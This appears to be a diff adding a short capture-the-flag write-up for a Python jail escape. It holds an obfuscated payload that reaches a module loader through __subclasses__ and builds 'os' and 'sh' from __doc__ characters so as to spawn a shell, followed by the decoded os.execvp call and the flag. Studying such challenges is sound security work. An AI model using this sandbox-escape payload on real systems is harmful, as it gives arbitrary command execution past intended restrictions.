@@ -1,0 +1,5 @@
+input: ().__class__.__bases__[0].__subclasses__()[84].load_module(().__class__.__doc__[34]+().__class__.__doc__[19]).execvp(().__class__.__doc__[19]+().__class__.__doc__[56], [().__class__.__doc__[19]+().__class__.__doc__[56]])
+
+becomes os.execvp("sh", ["sh"])
+
+CHTB{n0_j4il_c4n_h4ndl3_m3!}
